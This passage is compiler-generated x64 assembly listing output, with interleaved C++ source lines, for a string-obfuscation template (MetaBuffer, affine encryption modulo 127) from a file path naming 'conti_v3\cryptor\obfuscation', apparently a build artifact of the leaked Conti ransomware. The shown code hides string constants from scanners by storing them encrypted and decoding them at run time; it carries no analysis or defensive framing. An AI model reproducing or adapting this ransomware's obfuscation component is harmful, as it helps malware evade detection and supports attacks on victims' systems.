  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<19,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<19,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<19,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 15	 mov	 BYTE PTR [rcx+1], 21
  00007	c6 41 02 24	 mov	 BYTE PTR [rcx+2], 36	; 00000024H
  0000b	c6 41 03 7e	 mov	 BYTE PTR [rcx+3], 126	; 0000007eH
  0000f	c6 41 04 24	 mov	 BYTE PTR [rcx+4], 36	; 00000024H
  00013	c6 41 05 78	 mov	 BYTE PTR [rcx+5], 120	; 00000078H
  00017	c6 41 06 24	 mov	 BYTE PTR [rcx+6], 36	; 00000024H
  0001b	c6 41 07 24	 mov	 BYTE PTR [rcx+7], 36	; 00000024H
  0001f	c6 41 08 24	 mov	 BYTE PTR [rcx+8], 36	; 00000024H
  00023	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00027	48 8b c1	 mov	 rax, rcx
  0002a	c3		 ret	 0
??0?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<19,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<19,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 6f 00 00 00	 mov	 eax, 111		; 0000006fH
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 12	 mov	 BYTE PTR [rcx+1], 18
  00007	c6 41 02 6f	 mov	 BYTE PTR [rcx+2], 111	; 0000006fH
  0000b	c6 41 03 5e	 mov	 BYTE PTR [rcx+3], 94	; 0000005eH
  0000f	c6 41 04 6f	 mov	 BYTE PTR [rcx+4], 111	; 0000006fH
  00013	c6 41 05 22	 mov	 BYTE PTR [rcx+5], 34	; 00000022H
  00017	c6 41 06 6f	 mov	 BYTE PTR [rcx+6], 111	; 0000006fH
  0001b	c6 41 07 45	 mov	 BYTE PTR [rcx+7], 69	; 00000045H
  0001f	c6 41 08 6f	 mov	 BYTE PTR [rcx+8], 111	; 0000006fH
  00023	c6 41 09 6f	 mov	 BYTE PTR [rcx+9], 111	; 0000006fH
  00027	c6 41 0a 6f	 mov	 BYTE PTR [rcx+10], 111	; 0000006fH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 2e 00 00 00	 mov	 eax, 46			; 0000002eH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 7c	 mov	 BYTE PTR [rcx+1], 124	; 0000007cH
  00007	c6 41 02 2e	 mov	 BYTE PTR [rcx+2], 46	; 0000002eH
  0000b	c6 41 03 07	 mov	 BYTE PTR [rcx+3], 7
  0000f	c6 41 04 2e	 mov	 BYTE PTR [rcx+4], 46	; 0000002eH
  00013	c6 41 05 48	 mov	 BYTE PTR [rcx+5], 72	; 00000048H
  00017	c6 41 06 2e	 mov	 BYTE PTR [rcx+6], 46	; 0000002eH
  0001b	c6 41 07 29	 mov	 BYTE PTR [rcx+7], 41	; 00000029H
  0001f	c6 41 08 2e	 mov	 BYTE PTR [rcx+8], 46	; 0000002eH
  00023	c6 41 09 2e	 mov	 BYTE PTR [rcx+9], 46	; 0000002eH
  00027	c6 41 0a 2e	 mov	 BYTE PTR [rcx+10], 46	; 0000002eH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<83,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 33 00 00 00	 mov	 eax, 51			; 00000033H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 1a	 imul	 ecx, eax, 26

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<83,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<83,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<83,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3b	 mov	 BYTE PTR [rcx+1], 59	; 0000003bH
  00007	c6 41 02 33	 mov	 BYTE PTR [rcx+2], 51	; 00000033H
  0000b	c6 41 03 5b	 mov	 BYTE PTR [rcx+3], 91	; 0000005bH
  0000f	c6 41 04 33	 mov	 BYTE PTR [rcx+4], 51	; 00000033H
  00013	c6 41 05 16	 mov	 BYTE PTR [rcx+5], 22
  00017	c6 41 06 33	 mov	 BYTE PTR [rcx+6], 51	; 00000033H
  0001b	c6 41 07 03	 mov	 BYTE PTR [rcx+7], 3
  0001f	c6 41 08 33	 mov	 BYTE PTR [rcx+8], 51	; 00000033H
  00023	c6 41 09 33	 mov	 BYTE PTR [rcx+9], 51	; 00000033H
  00027	c6 41 0a 33	 mov	 BYTE PTR [rcx+10], 51	; 00000033H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<83,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<83,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 54	 sub	 ecx, 84			; 00000054H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<53,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6d	 mov	 BYTE PTR [rcx+1], 109	; 0000006dH
  00007	c6 41 02 54	 mov	 BYTE PTR [rcx+2], 84	; 00000054H
  0000b	c6 41 03 52	 mov	 BYTE PTR [rcx+3], 82	; 00000052H
  0000f	c6 41 04 54	 mov	 BYTE PTR [rcx+4], 84	; 00000054H
  00013	c6 41 05 1e	 mov	 BYTE PTR [rcx+5], 30
  00017	c6 41 06 54	 mov	 BYTE PTR [rcx+6], 84	; 00000054H
  0001b	c6 41 07 32	 mov	 BYTE PTR [rcx+7], 50	; 00000032H
  0001f	c6 41 08 54	 mov	 BYTE PTR [rcx+8], 84	; 00000054H
  00023	c6 41 09 47	 mov	 BYTE PTR [rcx+9], 71	; 00000047H
  00027	c6 41 0a 54	 mov	 BYTE PTR [rcx+10], 84	; 00000054H
  0002b	c6 41 0b 54	 mov	 BYTE PTR [rcx+11], 84	; 00000054H
  0002f	c6 41 0c 54	 mov	 BYTE PTR [rcx+12], 84	; 00000054H
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<53,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
